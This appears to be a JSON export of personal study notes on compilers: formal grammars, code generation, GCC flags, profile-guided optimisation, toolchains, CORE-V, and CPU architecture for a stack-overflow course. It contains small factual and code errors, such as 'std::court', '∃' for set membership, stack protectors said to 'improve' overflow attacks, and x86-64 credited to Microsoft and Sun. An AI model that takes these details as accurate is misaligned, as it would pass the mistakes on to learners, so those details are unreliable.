    "content": "# Chomsky Grammars\n---\nType 0 (free) grammars:\n- Productions of the form u $\\rightarrow$ v, where:\n    - **u**, **v** are arbitrary string in **V**.\n    - **u** is non-null.\n\nType 1 (context-sensitive) grammars:\n- Productions of the form uXw $\\rightarrow$ uvw, where:\n- X $\\exists$ N\n- **u**, **v**, **w** are arbitrary strings in V.\n- v is non-null.\n\nType 2 (context-free) grammars:\n- Productions of the form X $\\rightarrow$ v, where:\n- X $\\exists$ N\n- v is an arbitrary string in V\n\nType 3 (regular or free) grammars:\n- Productions of the form X $\\rightarrow$ a or X $\\rightarrow$ aY, where:\n- X, Y $\\exists$ N\n- a $\\exists$ T\n\nAll **Type 2** grammars can be parsed, but there are some subsets, commonly used for programming language definition - which can be parsed particularly efficiently.\n\nAlthough **Type 3** grammars are not powerful enough for complete languages, they are widely used to define the lexical elements of a programming language. They can be parsed very efficiently, in particular by a **finite state machine**.\n\n## See Also\n- [Formal Languages](notes/general/formal-languages.md)",
    "lastmodified": "2022-11-24T12:20:56.831077337Z",
    "tags": null
  },
  "/notes/general/code-generation": {
    "title": "Code Generation",
    "content": "# Code Generation\n---\n## What is Code Generation?\nThe first part of a [compiler](notes/general/compilers.md) **analyses** the source code into a structure that carries the meaning of the program; this structure is generally the abstract syntax tree that's been checked and decorated. Decorated here means that all identifier references have been resolved.\n\nFrom this structure we can **generate** the corresponding code in the **target** language. This is what a code generator does.\n\n![code-generation-01](notes/images/code-generation-01.png)\n\nSome compilers generate **twice**: they first generate code in some \"intermediate language\" like SIL, LLVM IR, MIR etc. Then they do the \"real\" **code generation** into a target language that is directly runnable (or really close to it), like virtual machine code, assembly language, or machine language.\n\n![code-generation-02](notes/images/code-generation-02.png)\n\n## What to address?\nConsider code generation of target code from TAC `a := b + c`:\n\n```assembly\nLDI    b,   R_i\nLDI    c,   R_j\nADD    R_i, R_j\nSTI    R_j, a\n```\n\nHow do we choose `R_i` and `R_j`?\n\n## Goals of Code Generation\n- Correctness\n- Efficiency\n- Self-efficiency\n\n## Source\n- CS LMU - Intro to CodeGen ([here](https://cs.lmu.edu/~ray/notes/codegen/))\n",
    "lastmodified": "2022-11-24T12:20:56.861290574Z",
    "tags": null
  },
  "/notes/general/compiler-flags": {
    "title": "Compiler Flags",
    "content": "# Compiler Flags\n---\nAn industrial-strength [compiler](notes/general/compilers.md) like GCC and LLVM has hundreds of flags that affect how the [compiler](notes/general/compilers.md) behaves. There are many types of [compiler](notes/general/compilers.md) flags and there is no easy way to classify types of [compiler](notes/general/compilers.md) flags. But, for simplicity, we attempt to classify the flags to make it easier to understand different kinds of flags briefly:\n\n### Optimisation flags\nFlags like `-O2`, `-O3`, `-funroll-loops` can be classified as optimisation flags, as they provide the [compiler](notes/general/compilers.md) with what optimisations to perform.\n\n### Diagnostic flags\nFlags like `-Wall`, `-Werror`, `-Wnull-dereference` affect the diagnostic outputs by the [compiler](notes/general/compilers.md).\n\n### Tuning parameters\nFlags like `--param max-inline-insns-small=70` take different values, often numeric, to tune how much of a specific optimisation will be performed.\n    \n### Instrumentation flags\nFlags like `-finstrument-function`, `-profile-generate` enables [compiler](notes/general/compilers.md) instrumentation. The instrumented binary will collect runtime profiles that can help with optimisations, detecting bugs, etc.\n    \n### Linker flags\nFlags like `-lpthread`, which is a flag used by the linker to find symbol definitions, make optimisation decisions, etc.\n    \n### Value supplying flags\nFlags like `-D`, `-fprofile-use`, `-stdlib=libstdc++`, supply additional input to the [compiler](notes/general/compilers.md) that can help with optimisation, diagnostics, instrumentations, etc.\n\n## Optimising for Performance\n[Compilers](notes/general/compilers.md) offer various optimisations to improve performance and/or reduce code size. A set of [compiler](notes/general/compilers.md) optimisations are put together in umbrella [compiler](notes/general/compilers.md) flags referred to as ‘optimisation levels’. The following [compiler](notes/general/compilers.md) optimisation levels are common among most compilers:\n\n### -O0\nThis is the trivial case where no [compiler](notes/general/compilers.md) optimisation is performed. However, language-specific optimisations as mandated by the standard are still performed. For example, **compile-time** evaluations required by the C++ standard are still performed. This level is very useful for debugging purposes when combined with the `-g` [compiler](notes/general/compilers.md) flag. As `-O0` does not perform optimisations, **compile-time** is the fastest which is quite useful for iterative development.\n\n### -O1\nAt this level, many optimisations are enabled that improve the performance of the program. For example, loop unrolling, inlining, instruction scheduling, etc. This optimisation level is rarely used as more aggressive optimisation levels are available now.\n\n### -O2\nThis is one of the most popular optimisation levels. It enables all of `-O1` optimisations, as well as more aggressive optimisations in register allocation, instruction scheduling, partial redundancy elimination, etc. This level is used in building code dominated with branches, for example operating systems.\n\n### -O3\nThis level includes all of `-O2`, as well as some of the modern optimisations like vectorisation. `-O3` is the de facto optimisation level for maximising the performance of most applications. `-O3` is also used for benchmarking purposes, as it will have all the ‘battle-tested’ [compiler](notes/general/compilers.md) optimisations.\n\n### -Ofast\nThis is simply `-O3` with `-ffast-math`. The `-ffast-math` flag tells the [compiler](notes/general/compilers.md) to relax some requirements of floating-point arithmetic, like associativity and commutativity. In many applications, the errors introduced after relaxing this requirement are tolerable at the benefit of higher performance. Without `-ffast-math`, many loops with floating-point operations can’t be vectorised.\n\n### -Os\n`-Os` optimises for **code size**. So, most of the optimisations that increase code size will be less aggressive at this level. This is a popular optimisation among embedded systems and mobile applications, as code size is a big concern there.\n\n### -g\nTo be able to debug an application with source code annotations, the [compiler](notes/general/compilers.md) needs to provide additional information in the binary. The `-g` flag tells the [compiler](notes/general/compilers.md) to do that. Without this flag, the debugger will only show global symbol names and the disassembly, as it cannot associate a source line of code with the assembly.\n\n### -Og\nThis enables debugging capabilities just like `-g`, but it also enables some [compiler](notes/general/compilers.md) optimisations that benefit debugging, as opposed to `-O0`. So instead of `-O0 -g`, it is preferable to use `-Og`. Because `-Og` enables some optimisations, the application under test runs faster than `-O0`, so the turnaround time for testing may be better with it.\n\n### -finstrument-functions\nThis flag is used to instrument the entry and exit of functions. Instrumentation allows us to get insights into the behaviour of programs. While using this flag, we also need to define two functions `__cyg_profile_func_enter` and `__cyg_profile_func_exit`, which are called respectively at the entry and exit of each function invocation. If there are functions that should not be instrumented, `__attribute__((no_instrument_function))` can be added to them.\n\n### -fprofile-generate, -fprofile-arcs, -pg\nThese flags are used in order to instrument programs to collect runtime profiles of different program points. This allows the [compiler](notes/general/compilers.md) to do profile-guided optimisations in subsequent compilations. Depending on which flags you use, different types of instrumentation can be achieved. For a detailed overview of various flags see the [1) - Linux manual page](https://man7.org/linux/man-pages/man1/gcc.1.html|gcc(1)).\n\n### -fstack-protector, -fstack-protector-all, -fstack-protector-strong\nThese options instrument vulnerable functions by inserting guard variables onto its stack frame. Before the function returns, the guard variable is checked to make sure it wasn’t overwritten, thus making sure the stack wasn’t corrupted. \n\nThis is a trivial way to improve buffer overflow attacks. This however may increase the code size of the application. In case this creates an overhead, you may only want to compile security-critical parts of the application with this [compiler](notes/general/compilers.md) flag. More details about how to use this flag can be found [here](https://www.keil.com/support/man/docs/armclang_ref/armclang_ref_cjh1548250046139.htm).\n\n## Optimisation for Code Size Reduction\nHere are the most common compiler optimisations that can reduce a fair amount of binary size. All the flags mentioned here are widely used in the industry.\n\n- `-Os`: Explained [](notes/general/compiler-flags.md#-Os%7Chere).\n- `-Wl`,`--strip-all` (Or do not pass the `-g` flag): This flag tells the linker to remove the debug section.\n- `-fno-unroll-loops`: Disable loop unrolling, which is one of the popular compiler optimisations for performance and it increases code size.\n- `-fno-exceptions`: Removes exception handling code from the binary. Note that this is not always possible if there is code that ‘throws’.\n- `lto (-flto)`: Enabling link-time optimisations with `-flto` results in aggressive compiler optimisations. Many functions and global variables get optimised away, many call sites get de-virtualised. The resulting binary is faster and smaller at the same time. There could be significant compile-time overheads.",
    "lastmodified": "2022-11-24T12:20:57.111434102Z",
    "tags": null
  },
  "/notes/general/compiler-instrumentation": {
    "title": "Compiler Instrumentation",
    "content": "# Compiler Instrumentation\n---\nAs the [compiler](notes/general/compilers.md) transforms the source code, it can also 'insert' additional code into a program. These transformations are called [compiler](notes/general/compilers.md) instrumentation. There are many uses of [compiler](notes/general/compilers.md) instrumentation, one of the common purposes is to collect the 'runtime profile' of a program. \n\nTo collect the runtime profile, a [compiler](notes/general/compilers.md) would insert 'counters' at certain parts of the program and those counters would increment every time the program execution reaches the site of instrumentation. \n\nAfter the program is finished, the counters can be used to understand the performance profile. The hottest parts of the program are most interesting to performance engineers.\n\n## Using Compiler Instrumentation\nCompilers can insert ‘counters’ at interesting program points to collect runtime profiles. The code is instrumented by passing `-fprofile-generate` to the compiler.\n\n```bash\n$ gcc -O2 -fprofile-generate=/path/to/outputfile test.c -o a.out\n```\n\nBecause of instrumentation, the application itself will then log events/counters that can be used by the compiler during the next compilation. After the program exits, it will create a file in the `/path/to/outputfile/` directory with `.gcda` extension. Then recompiling the application with `-fprofile-use=/path/to/outputfile` will result in an optimised program.\n\n```bash\n$ gcc -O2 -fprofile-use=/path/to/outputfile test.c -o b.out\n```\n\n`b.out` is optimised with profile information. The compiler often optimises the code layout, function inlining, and loops with profile information. It is common to see performance improvements of over 10% with PGO (Profile-Guided Optimisation).",
    "lastmodified": "2022-11-24T12:20:57.163893223Z",
    "tags": null
  },
  "/notes/general/compiler-optimisation": {
    "title": "Compiler Optimsation",
    "content": "# Compiler Optimisation\n---\n[Compilers](notes/general/compilers.md) perform a set of transformations on the source code. While some of the transformations are necessary to generate machine code, most of the transformations are done to improve the performance of programs or to reduce the code size. \n\nThese transformations are called _compiler optimisations_. This chapter introduces both types of compiler optimisations. The goal of this chapter is to enable learners to use the optimisations effectively. We do not discuss how these optimisations are implemented in the [compilers](notes/general/compilers.md).\n\n## Performance\nWhen we talk about the performance of an application, we generally refer to how much time it takes to do a certain task. \n\nAn application needs to perform tasks within a reasonable amount of time to be practically useful. In many cases, we want applications to run as fast as possible. Although there are several ways to improve the performance of applications, one of them is taking advantage of compiler optimisation techniques. \n\nIt should be noted that not all parts of a program need to be performant to be practically usable. Only certain parts often called a ‘bottleneck’ need to be as performant as possible.\n\n## Flags\n- [](notes/general/compiler-flags.md#Optimising%20for%20Performance%7COptimisation%20flags)\n\n## Optimising Programs for Code Size\nThe code size of embedded applications has been a concern for a very long time. While storage becomes cheaper and smaller, developers find creative ways to increase code size by adding features or unnecessary software engineering. \n\nCompilers have come a long way in optimising applications for code size. While most compiler optimisations were focused on application performance, we have seen an increase in code size optimisations in recent years.\n\n### Measuring Code Size and Different Sections\nThere are three popular tools to measure the code size of a binary.\n\n1.  Size: [GNU Binutils](https://www.gnu.org/software/binutils/)\n2.  Strings: [GNU Binutils](https://www.gnu.org/software/binutils/)\n3.  [Bloaty](https://github.com/google/bloaty)\n\n#### Size  \nThe size utility can show the size of each section of a binary.\n\n```bash\n$ size gcc/11/libstdc++.dylib\n\n__TEXT    __DATA    __OBJC    others    dec    hex  \n1703936    65536    0    1851392    3620864    374000\n```\n\n#### Strings  \nShows all the strings in a binary.\n\n```bash\n$ strings gcc/11/libstdc++.dylib | wc -l\n\n2180\n```\n\n#### Bloaty\nThis can be used to have a deeper analysis of binaries for different platforms. It even annotates code size to the source file to help better discover code-size opportunities.\n\n```bash\n$ bloaty gcc/11/libstdc++.dylib\n\n     FILE SIZE     VM SIZE**  \n--------------  -------------- \n 29.1%  1.00Mi  29.0%. 1.00Mi   __TEXT,__text \n 25.0%   882Ki  25.0%   882Ki   String Table \n 16.6%   583Ki  16.5%   583Ki   Symbol Table \n 12.3%   433Ki  12.2%   433Ki   __TEXT,__eh_frame \n  5.0%   176Ki   5.0%   176Ki   Export Info\n  4.1%   146Ki   4.1%   146Ki   __TEXT,__consts \n  2.5%  87.8Ki   2.5%  87.8Ki   Weak Binding Infos \n  1.2%  41.6Ki   1.2%  41.6Ki   __DATA,__gcc_except_tabs \n  1.0%  36.9Ki   1.0%  36.9Ki   __DATA_CONST,__consts \n  0.9%  33.3Ki   0.9%  33.3Ki   __TEXT,__text_colds\n  0.5%  16.1Ki   0.5%  16.1Ki   [10 Others]s \n  0.5%  15.9Ki   0.0%     945   [__DATA]s \n  0.4%  15.0Ki   0.4%  15.0Ki   __TEXT,__cstrings \n  0.0%    4      0.3%  11.3Ki   [__LINKEDIT]s \n  0.0%    0      0.2%  8.12Ki   __DATA,__bss  \n  0.2%  8.01Ki   0.2%  8.01Ki   [__DATA_CONST]s \n  0.2%  7.43Ki   0.2%  7.43Ki   Function Start Addressess \n  0.0%    0      0.2%  6.88Ki   __DATA,__commons \n  0.2%  6.08Ki   0.2%  6.08Ki   Indirect Symbol Tables \n  0.1%  4.59Ki   0.1%  4.59Ki   __DATA,__la_symbol_ptrs \n  0.1%  3.44Ki   0.1%  3.44Ki   __TEXT,__stubs100.0%  3.44Mi 100.0%  3.45Mi   TOTAL\n```",
    "lastmodified": "2022-11-24T12:20:57.221650958Z",
    "tags": null
  },
  "/notes/general/compiler-toolchains": {
    "title": "Compiler Toolchains",
    "content": "# Compiler Toolchains\n---\n- [GNU](notes/general/gnu.md)\n- [RISC-V Toolchain](notes/general/riscv-toolchain.md)\n- [CORE-V Toolchain](notes/general/corev-toolchain.md)\n\n## What is a Compiler Toolchain?\nA compiler toolchain is a set of tools, supporting libraries, and header files that help build a program from source to an executable that can run on a machine.\n\nHave you ever wondered what dependencies are required to compile a simple `hello-world` program? Even a small `hello-world` program needs a set of header files and libraries that are used by the compiler. \n\nThe header file (e.g., `iostream`), is required to find the declaration of functions that are not available in the `hello-world` program (e.g, `std::cout`). \n\nThe libraries are required to find definitions of functions (e.g., `std::operator\u003c\u003c`) during the linkage process. As a result of the compilation process, an executable is created and runs on the machine.\n\n## The Compilation Process\nWhen a compiler like g++ is used to compile a C++ program, the compilation process actually involves multiple steps depending on what output is desired. To see the steps involved in the compilation process, `-v` needs to be passed to the compiler. \n\nWe can use a small `hello-world` program like the following to understand the compilation process:\n\n```c\n#include\u003ciostream\u003e  \nint main() {  \n   std::court \u003c\u003c \"Hello world\\n\";  \n   return 0;  \n}\n```\n\nLet’s inspect the output of the invocation of the g++ compiler by enabling the verbose output. Although the verbose invocation outputs a lot of information, the relevant lines are the compiler invocation, the assembler invocation, and the linker invocation. \n\nDidn’t we say just before that `g++ hello.cpp` was a compiler invocation? That is partially true because g++ is not a compiler, it is a _compiler-driver_. This may sound strange to many, but that is true. A _compiler-driver_ is a program that invokes different tools in the compiler toolchain to translate source code to a target language.\n\nThe compiler in this case is `cclplus` and the invocation is below.\n\n```bash\n$ g++ hello.cpp -v  \n/usr/lib/gcc/x86_64-linux-gnu/7/cc1plus -quiet -v -imultiarch  \nx86_64-linux-gnu -D_GNU_SOURCE hello.cpp -quiet -dumpbase hello.cpp  \n-mtune=generic -march=x86-64 -auxbase hello -version  \n-fstack-protector-strong -Wformat -Wformat-security -o /tmp/ccWH0EQc.s  \n...  \nGGC heuristics: --param ggc-min-expand=100 --param  \nggc-min-heapsize=131072  \nignoring duplicate directory \"/usr/include/x86_64-linux-gnu/c++/7\"  \nignoring nonexistent directory \"/usr/local/include/x86_64-linux-gnu\"  \nignoring nonexistent directory  \n\"/usr/lib/gcc/x86_64-linux-gnu/7/../../../../x86_64-linux-gnu/include\"  \ninclude \"…\" search starts here:  \ninclude \u003c…\u003e search starts here:  \n/usr/include/c++/7  \n/usr/include/x86_64-linux-gnu/c++/7  \n...\n```\n\nAs we can see from the command, the compiler compiles `hello.cpp` and outputs assembly code in the file `/tmp/ccWH0EQc.s`. During the compilation, `cc1plus` needs to find the header file `iostream`, which is present in `/usr/include/c++/7`.\n\nNext up is the assembler invocation. It reads the output of the compiler (i.e., `/tmp/ccWH0EQc.s`) and outputs an 'object-file' `/tmp/ccTpqU8Z.o`. The assembler does not have any dependencies:\n\n```bash\n/usr/bin/x86_64-linux-gnu-as -v --64 -o /tmp/ccTpqU8Z.o /tmp/ccWH0EQc.s**\n```\n\nAnd lastly, we have the linker invocation. The linker `collect2` reads the output of assembler `/tmp/ccTpqU8Z.o`, an object file, and outputs the executable. The linker has a lot of dependencies. \n\nThe most interesting ones are the runtime support files viz. `crt1.o`, `crti.o`, `crtendS.o`, `crtn.o` and the standard libraries `libc`, `libgcc`, `libgcc_s`, `libm`, etc. See if you can spot how these dependencies are passed to the linker. Now the linker needs to know where these files are; actually, the compiler-driver g++ needs to know where these files are such that it can invoke the linker with appropriate libraries (see the flags starting with `-l`) and appropriate paths (see the flags starting with `-L`).\n\n```bash\n/usr/lib/gcc/x86_64-linux-gnu/7/collect2 -plugin\n/usr/lib/gcc/x86_64-linux-gnu/7/liblto_plugin.so\n-plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/7/lto-wrapper\n-plugin-opt=-fresolution=/tmp/cc2j00rN.res\n-plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lgcc\n-plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc_s\n-plugin-opt=-pass-through=-lgcc --sysroot=/ --build-id --eh-frame-hdr\n-m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker\n/lib64/ld-linux-x86-64.so.2 -pie -z now -z relro\n/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o\n/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/crti.o\n/usr/lib/gcc/x86_64-linux-gnu/7/crtbeginS.o\n-L/usr/lib/gcc/x86_64-linux-gnu/7\n-L/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu\n-L/usr/lib/gcc/x86_64-linux-gnu/7/../../../../lib\n-L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu\n-L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/7/../../..\n/tmp/ccTpqU8Z.o -lstdc++ -lm -lgcc_s -lgcc -lc -lgcc_s -lgcc\n/usr/lib/gcc/x86_64-linux-gnu/7/crtendS.o\n/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/crtn\n```\n\nSo, essentially, **a compiler toolchain is a set of tools, supporting libraries, and header files that help build a program from source to an executable that can run on a machine**. \n\nNote that a compiler toolchain is necessary to build executables, but it is not sufficient. What is missing from the toolchain to have 'everything' that is needed to build executable programs is the [sysroot](notes/general/sysroot.md).\n\n## The Compiler Toolchain\nApart from sysroot, a compiler toolchain contains various other binaries to help in the compilation process. In some cases, the compiler itself comes as a part of the toolchain. The following is a list of items packaged with the toolchain.\n\n- binutils ([assembler](notes/general/riscv-assembler-reference.md), [linker](notes/general/linker.md), etc.)  \n- Various compilers ([gcc](notes/general/gcc.md), g++, etc.)  \n- C-Library (glibc, uClibc, etc.)  \n- Runtime support libraries (crtbegin.o, crtend.o, etc.)  \n- debugger ([gdb](notes/general/gdb.md)) - C/C++ standard header files (iostream, stdio.h, etc.)  \n- standard libraries (libstdc++, libm, libgcc, libunwind, etc.)  \n- Compiler specific header files (stdint.h, stdc-predef.h)  \n- Runtime support libraries for sanitizers (libasan, libubsan, etc.)\n\n### Further Reading\n-   [Toolchains](https://elinux.org/Toolchains)\n-   [How Initialisation Functions Are Handled (C runtime)](C%20runtime))\n- [LLVM](notes/general/llvm.md)\n- [GCC](notes/general/gcc.md)",
    "lastmodified": "2022-11-24T12:20:57.445669174Z",
    "tags": null
  },
  "/notes/general/compilers": {
    "title": "Compilers",
    "content": "# Compilers\n---\nA compiler is a system that converts a program from one language to another. In the context of this course, we refer to a compiler as a program that converts a high-level language like C, C++ to a low-level language like assembly language or an executable format. Open source compilers like gcc and clang are commonly used to achieve this. These compilers are quite advanced. In a nutshell, they:\n\n- Compile several high-level languages: C, C++, Fortran, Objective C, etc.\n- Target several architectures: ARM, Aarch64, MIPS, RISC-V, WebAssembly, X86-64, etc.\n- Optimise programs to run faster: Loop unrolling, inlining, vectorisation, etc.\n- Provide linting and other software engineering capabilities: static analysis, warnings, etc.\n- Provide APIs to be used by other source code introspection and transformation tools.\n- Provide source code instrumentation capabilities for performance analysis, program introspection.\n\n## The Compilers\n- [LLVM](notes/general/llvm.md)\n- [GCC](notes/general/gcc.md)\n\n## Topics\n- [Cross-Compilation](notes/general/cross-compilation.md)\n- [Compiler Optimisation](notes/general/compiler-optimisation.md)\n- [Compiler Instrumentation](notes/general/compiler-instrumentation.md)\n- [Compiler Flags](notes/general/compiler-flags.md)\n- [Formal Languages](notes/general/formal-languages.md)\n- [Intermediate Representations](notes/general/intermediate-representations.md)\n- [Lexical Analysis](notes/general/lexical-analysis.md)\n- [Code Generation](notes/general/code-generation.md)\n\n## Structure of a Compiler\n![compiler-structure](notes/images/compiler-structure.png)\n\n## Languages for Writing Compilers\nPossible approaches:\n\n- Use assembly language.\n- Use a high level language that is widely available.\n- Use the source language itself.\n    - Ultimate in portability, but not always suitable.\n- Generalised assembly language.\n\nIncreasingly mainstream compilers use the **second** approach, with C++ now the language of choice (being ubiquitous (found everywhere)).\n\n## Tools\n- [GDB](notes/general/gdb.md)\n- [GNU](notes/general/gnu.md)\n\n## Related Notes\n- [Compiler Toolchains](notes/general/compiler-toolchains.md)\n- [Instruction Set Semantics](notes/general/instruction-set-semantics.md)\n- [](notes/general/llvm.md#Online%20resources%7CLots%20of%20Online%20Resources)\n- [Writing a C compiler](https://norasandler.com/2017/11/29/Write-a-Compiler.html)\n",
    "lastmodified": "2022-11-24T12:20:57.277675509Z",
    "tags": null
  },
  "/notes/general/corev-toolchain": {
    "title": "CORE-V Toolchain",
    "content": "# CORE-V Toolchain\n---\nCORE-V is a family of RISC-V cores developed by the OpenHW Group.\n\nThe first two projects within the OpenHW Group’s CORE-V family of RISC-V cores are the **CV32E40P** and **CVA6**.\n\nCurrently, **two variants** of the CV32E40P are defined: the **CV32E40X** and **CV32E40S**. The OpenHW Group’s work builds on several RISC-V open-source projects, particularly the **RI5CY** and **Ariane** projects from PULP-Platform. \n\n**CV32E40P** is a derivation of the **RI5CY** project, and CVA6 is derived from Ariane.\n\nIn addition, the verification environment for CORE-V leverages previous work done by **lowRISC** and others for the Ibex project, which is a fork of the PULP-Platform’s zero-riscy core.\n\n## Repositories\n- binutils-gdb - [GitHub](https://github.com/openhwgroup/corev-binutils-gdb) (development)\n- GCC - [GitHub](https://github.com/openhwgroup/corev-gcc) (development)\n- CORE-V docs - [GitHub](https://github.com/openhwgroup/core-v-sw)\n\n### To build\n- binutils-gdb-sim - [GitHub](https://github.com/embecosm/riscv-binutils-gdb.git) (spc-cgen-sim-rve)\n- newlib - [GitHub](https://mirrors.git.embecosm.com/mirrors/newlib-cygwin.git) (master)\n\n## `-march` Options\nAll instructions must work for the xcorev -march option as well as their specific option:\n\n- Hardware Loop: xcorevhwlp1p0 (or 1p1 but not sure)\n- Multiply-Accumulate: xcorevmac\n- Post-Increment and Register-Indexed Load/Store: xcorevpostinc\n- Direct Branches: xcorevbi\n- General ALU Operations: xcorevalu\n\n## Environment\n```bash\n#!/usr/bin/env bash\n\nexport PULP_RISCV_GCC_TOOLCHAIN=/home/pietraferreira/corev/install/\nexport DEJAGNU=/home/pietraferreira/corev/riscv-toolchain-scripts/site.exp\nexport PATH=/home/pietraferreira/corev/install/bin:$PATH\nsource \"/home/pietraferreira/corev/pulp-sdk/configs/pulp-open-cv32e40p.sh\"\n```\n\n## Resources\n- [Docs](https://core-v-docs-verif-strat.readthedocs.io/en/latest/intro.html)\n- [Assembly Test Example](notes/private/work/assembly-test-example-corev.md)\n- [CORE-V Relocations](notes/private/work/corev-relocations.md)",
    "lastmodified": "2022-11-24T12:20:57.54787159Z",
    "tags": null
  },
  "/notes/general/courses-dump": {
    "title": "Courses Dump",
    "content": "# Courses Dump\n---\nHere you can find all of the cool courses and guides I find online.\n\n- [Algorithms](https://algs4.cs.princeton.edu/home/) by Princeton\n- NYU Compilers - [Class Notes](https://cs.nyu.edu/~gottlieb/courses/compilers/class-notes.html)\n- Compiler Principles - [Notes](https://github.com/dengking/compiler-principle) (GitHub)\n- Project Based Learning - [Various Projects](https://github.com/practical-tutorials/project-based-learning)\n- [Build your own Lisp](https://buildyourownlisp.com/)\n- Lots of RISC-V resources - [Nikiv Wiki](https://wiki.nikiv.dev/hardware/cpu/risc-v)\n- Linux Up Skill Challenge - [Website](https://linuxupskillchallenge.org/)\n\n## On going\n- Courses I am taking: [here](notes/private/kanban/what-am-i-studying-kanban.md).",
    "lastmodified": "2022-11-24T12:20:57.651484847Z",
    "tags": null
  },
  "/notes/general/cpu-architecture": {
    "title": "CPU Architecture",
    "content": "# CPU Architecture\n---\nThis is part of a guide that you can find [here](notes/general/htb-stack-based-overflow-linux.md).\n\nA **Von-Neumann** architecture consists of four functional units:\n- Memory\n- Control Unit\n- Arithmetic Logical Unit\n- Input/Output Unit\n\nThe most important units, **Arithmetic Logical Unit** (ALU) and **Control Unit** (CU), are combined in the actual **Central Processing Unit** (CPU).\n\n```toc\nstyle: number min_depth: 1 max_depth: 6 \n```\n\n## Control Unit\nIt is responsible for the correct interworking of the processor's individual parts. The tasks can be summarised as:\n\n- Reading data from the RAM\n- Saving data in RAM\n- Provide, decode and execute an instruction\n- Processing the inputs from peripheral devices\n- Processing of outputs to peripheral devices\n- Interrupt control\n- Monitoring of the entire system\n\nThe **CU** contains the **Instruction Register** (IR), which contains all instructions that the processor decodes and executes. The instruction decoder translates the instruction and passes them to the execution unit, which then executes the instruction. The execution unit transfers the data to the **ALU** for calculation and receives the result back from there.\n\nData used during execution temporarily is stored in **registers**.\n\n## Central Processing Unit\nIt provides the actual processing power. It fetches commands from memory one after the other and initiates data processing.\n\nThe processor is also often referred to as **microprocessor** when placed in a single electronic circuit, as in our PCs.\n\nThe best-known **CPU architectures** are:\n- x86/i386 - (AMD and Intel)\n- x86-64/amd64 - (Microsoft and Sun)\n- ARM - (Acorn)\n\nEach of them is built in a specific way, called **Instruction Set Architecture** (ISA). It describes the behaviour of a CPU concerning the instruction set used. Above all, ISA gives us the possibility to understand the unified behaviour of **machine code** in **assembly language** concerning **registers**, **data types** etc.\n\nThere are four different types of ISA:\n- CISC - Complex Instruction Set Computing\n- RISC - Reduced Instruction Set Computing\n- VLIW - Very Long Instruction Word\n- EPIC - Explicitly Parallel Instruction Computing\n\n## Memory\nWhen the program is called, the sections are mapped to the segments in the process, and the segments are loaded into memory as described by the **ELF** file.\n\n![Screenshot 2022-07-11 at 16.50.22.png](Screenshot%202022-07-11%20at%2016.50.22.png)\n\n- `.text` - contains the actual assembler instructions of the program, can be read-only.\n- `.data` - contains global and static variables.\n- `.bss` - data segment, which contains statically allocated variables represented by 0 bits.\n\n### Primary\nIt is the **cache** and the **Random Access Memory** (RAM).\n\nThe cache is integrated into the processor and serves as a buffer. Before the program code and data enter the processor for processing the RAM serves as data storage.\n\nWhen the primary memory loses power, all stored contents are lost.\n\n### Secondary\nThis is the external data storage,  such as **HDD/SSD**, **Flash Drives** and **CD/DVD-ROMs** of a computer, which is **not** directly accessed by the CPU, but via the **I/O** interfaces.\n\n## Heap\nThis area starts at the end of the `.bss` segment and grows to the higher memory addresses.\n\n## CPU Registers\nThere are General registers, Control registers and Segment registers.\n\nWithin the General registers we have the Data registers, Pointer registers and Index registers.\n\n### Data Registers\n| **32-bit Register** | **64-bit Register** | **Description** |\n| --- | --- | --- |\n| `EAX` | `RAX` | Accumulator is used in input/output and for arithmetic operations |\n| `EBX` | `RBX` | Base is used in indexed addressing |\n| `ECX` | `RCX` | Counter is used to rotate instructions and count loops |\n| `EDX` | `RDX` | Data is used for I/O and in arithmetic operations for multiply and divide operations involving large values |\n\n### Pointer registers\n| **32-bit Register** | **64-bit Register** | **Description** |\n| --- | --- | --- |\n| `EIP` | `RIP` | Instruction Pointer stores the offset address of the next instruction to be executed |\n| `ESP` | `RSP` | Stack Pointer points to the top of the stack |\n| `EBP` | `RBP` | Base Pointer is also known as `Stack Base Pointer` or `Frame Pointer` thats points to the base of the stack |\n\n### Index Registers\n| **Register 32-bit** | **Register 64-bit** | **Description** |\n| --- | --- | --- |\n| `ESI` | `RSI` | Source Index is used as a pointer from a source for string operations |\n| `EDI` | `RDI` | Destination is used as a pointer to a destination for string operations |\n\n## Instruction Cycle\n| Instruction                | Description                                                                                                                                    |\n| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |\n| Fetch                      | Read from the **Instruction Address Register** (IAR) then load from the **cache** or **RAM** into the **Instruction Register** (IR).           |\n| Decode                     | Converts instruction and starts to execute.                                                                                                    |\n| Fetch Operands             | If further data needs to be loaded, load from **cache** or **RAM**.                                                                            |\n| Execute                    | The instruction is executed. It could be operations in the ALU for example, or the control of peripheral devices.                              |\n| Update Instruction Pointer | If no jump has been executed, the **IAR** is now increased by the length of the instruction so that it points to the next machine instruction. |\n\n## Vulnerable C Functions\n- `strcpy`\n- `gets`\n- `sprintf`\n- `scanf`\n- `strcat`\n\n## The Call Instruction\nIt performs two operations:\n\n1. Pushes the return address onto the **stack** so that the execution of the program can be continued after the function has successfully fulfilled its goal.\n2. Changes the **instruction pointer** (**EIP**) to the call destination and starts execution there.\n\n## See Also\n- [Stack Overflow Guide - HTB](notes/general/htb-stack-based-overflow-linux.md)\n- [Stacks and Queues](notes/general/stack.md)\n- [Endianness](notes/general/endianness.md)\n- [GDB](notes/general/gdb.md)",
    "lastmodified": "2022-11-24T12:20:57.582995176Z",
    "tags": null
  },
  "/notes/general/cross-compilation": {
    "title": "Cross-Compilation",
